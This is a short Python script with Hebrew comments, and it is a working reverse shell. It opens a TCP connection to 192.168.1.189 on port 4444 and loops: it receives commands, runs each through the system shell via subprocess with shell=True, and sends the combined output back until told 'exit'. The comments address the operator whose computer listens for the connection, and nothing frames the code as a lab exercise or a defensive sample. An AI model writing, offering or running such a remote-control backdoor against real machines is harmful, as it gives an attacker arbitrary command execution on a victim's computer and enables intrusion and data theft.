import socket
import subprocess

# הגדרת פרטי החיבור שלך
server_ip = '192.168.1.189'
server_port = 4444  # הפורט שבו המחשב שלך מקשיב (אתה יכול לשנות את זה)

# יצירת סוקט לחיבור
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# התחברות למחשב שלך
s.connect((server_ip, server_port))

while True:
    # קבלת פקודה מהמחשב שלך
    command = s.recv(1024).decode()

    if command.lower() == 'exit':  # אם קיבלת פקודת יציאה, יצא מהלולאה
        break

    # הרצת הפקודה
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # שליחת פלט הפקודה חזרה למחשב שלך
    s.send(output.stdout + output.stderr)

# סגירת החיבור
s.close()
